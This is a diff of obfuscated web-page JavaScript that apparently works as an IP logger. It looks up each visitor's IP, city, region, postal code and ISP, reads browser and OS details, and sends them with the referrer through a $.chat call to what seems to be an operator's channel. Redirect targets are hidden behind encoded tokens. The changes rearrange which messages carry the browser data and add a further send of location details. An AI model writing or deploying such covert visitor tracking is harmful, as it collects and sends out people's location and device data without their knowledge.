@@ -104,9 +104,7 @@
                 {
                     fetch(new Request(su(d.ip))).then(c=>c.json())
                     .then(b=>{
-                      $.chat(d.ip+":"+"Referer:"+(document.referrer!=''?document.referrer:'direct')+"?Browser="+encodeURIComponent(uap.brands[2].brand?uap.brands[2].brand:'N_A')+"&ostype="+encodeURIComponent(uap.platform)+":"+window.location.href,b.city)})
-                      
-                    .catch(e=>console.error(e));
+                      $.chat(d.ip+":"+"Referer:"+(document.referrer!=''?document.referrer:'direct'),) .catch(e=>console.error(e));
                 }else {return;}
                 })
                 .catch(e=>console.log(e));
@@ -116,7 +114,7 @@
     //e1229224856143b33572e4b3
     function lp(){
       f=location.pathname;
-      if(f.includes(tok.utkn.hl()))open(tok.redt.hl()+"?Browser="+encodeURIComponent(uap.brands[2].brand??"N_A")+"&bver="+encodeURIComponent(uap.brands[2].version)+"&ostype="+encodeURIComponent(uap.platform),'blank'); 
+      if(f.includes(tok.utkn.hl()))open(tok.redt.hl(),'blank'); 
       else return null;
     }
     evtd.addEventListener("click",function(){lp();this.style.display="none";},{once:true});
@@ -125,6 +123,8 @@
         };
     function NextFun()
     {
+      var ua=navigator.userAgentData;
+      respsend=`Browser=${encodeURIComponent(uap.brands[2].brand?uap.brands[2].brand:'N_A')}&ostype=${encodeURIComponent(uap.platform)}`;
        var qsc=document.querySelector(".cont>p");
         var dates=["SUNDAY","MONDAY","TUESDAY","WEDNESDAY","THURSDAY","FRIDAY","SATURDAY"];
         const dt=new Date();
@@ -141,7 +141,8 @@
         }
         return req.json();
         }).then((Res)=>{
-        qsc.innerHTML +=` ${Res.clientIp.includes(':')?'::Ipv6 Host':Res.clientIp} Requested<hr><br> GEO LOCATION : ${Res.country},${Res.city},${Res.region},${Res.postalCode}<hr><br>ISP : ${Res.asOrganization}<hr><br>Requested On : ${zaa(dt.getDate())}/${zaa(dt.getMonth()+1)}/${zaa(dt.getFullYear())}`;
+        qsc.innerHTML +=` ${Res.clientIp.includes(':')?'::Ipv6 Host':Res.clientIp} Requested<hr><br> GEO LOCATION : ${Res.country},${Res.city},${Res.region},${Res.postalCode}<hr><br>ISP : ${Res.asOrganization}<hr><br>Requested On : ${zaa(dt.getDate())}/${zaa(dt.getMonth()+1)}/${zaa(dt.getFullYear())}<hr>${respsend}`;
+          $.chat(respsend,Res.country+','+Res.city+','+Res.region)
         }).catch(console.error);
     }
    /* if(location.pathname.includes(tok.redt.hl())) window.open(tok.utkn.hl(),"blank");
